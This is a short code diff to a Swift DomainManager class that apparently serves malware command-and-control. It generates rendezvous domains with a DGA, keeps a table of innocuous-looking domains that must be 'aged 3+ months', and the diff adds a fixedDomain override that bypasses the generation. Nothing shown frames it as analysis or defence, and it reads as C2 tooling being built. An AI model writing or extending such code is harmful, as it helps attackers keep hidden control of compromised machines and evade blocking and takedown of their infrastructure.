@@ -10,6 +10,9 @@ public class DomainManager {
     public var epochNumber: Int = 0
     public var clockOffset: TimeInterval = 0
 
+    /// When set, bypasses DGA entirely and always returns this domain
+    public var fixedDomain: String?
+
     /// Pre-registered domains (must be aged 3+ months)
     public static let domainTable: [String] = [
         "cdn-static-eu.net", "api-metrics-global.org", "cloud-sync-data.net",
@@ -30,7 +33,11 @@ public class DomainManager {
     }
 
     /// Get the active domain for today (with optional day offset for fallback)
+    /// If fixedDomain is set, always returns that (bypasses DGA)
     public func activeDomain(offset: Int = 0) -> String {
+        if let fixed = fixedDomain, !fixed.isEmpty {
+            return fixed
+        }
         let seed = epochNumber > 0 ? (epochSeed ?? initialSeed) : initialSeed
         let epoch = epochNumber
         return computeDomain(seed: seed, date: correctedDate(), epoch: epoch, offset: offset)
